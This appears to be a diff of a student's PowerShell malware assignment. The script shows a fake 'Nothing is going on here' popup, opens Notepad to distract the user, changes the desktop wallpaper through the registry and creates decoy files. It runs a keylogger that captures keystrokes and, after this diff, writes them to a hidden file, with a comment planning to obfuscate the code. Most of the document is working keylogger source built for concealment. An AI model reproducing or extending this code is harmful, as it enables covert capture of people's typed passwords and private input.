@@ -1,9 +1,12 @@
+#Obsufcate the code useless functions, a lot of junk variables and 
 #Need to alert if the application is working
 function Alert {
     $wshell = New-Object -ComObject Wscript.Shell
     $Output = $wshell.Popup("Nothing is going on here", 0, "Nothing")
     $Output
 }
+
+#May add some function to read individual important parts of a computer or make more files or something as a note
 
 #Used to send an array of keys, to then send back to the user, can be very basic
 function Keylogger {
@@ -21,8 +24,8 @@ function Keylogger {
         #Add to the string
         $keysnoted.Add($key.keychar)
     }
-    #Need to show the output of the keys just as a line, will instead send the keys back to the server when ran if needed to then output there
-    Write-Host "Collected Keys: $($keysnoted -join '')"
+    #Will need to write to a new file created instead to store and try and hide more
+    New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys.txt" -Value $($keysnoted -join '')
 }
 
 #Just used to distract the user
@@ -32,8 +35,20 @@ function OpeningNotepad {
     }
 }
 
-start-process powershell
+#Change background of desktop
+function ChangingDesktop {
+    set-itemproperty -path "HKCU:Control Panel\Desktop" -name WallPaper -value accipiter.png
+}
+
+#Adds a bunch of files in a directory
+function AddingFiles {
+    for ($i = 0; $i -lt 10; $i++) {
+        New-Item -ItemType File -Path "C:\Users\maazr\Desktop\Malware-Samples-IBM\Assignment\CO3410Assignment1\copiedkeys[$i].txt" -Value "THESE ARE ALL RANDOM FILES"
+    }
+}
+
 Write-Warning "This is a warning"
 Alert
 OpeningNotepad
+AddingFiles
 Keylogger
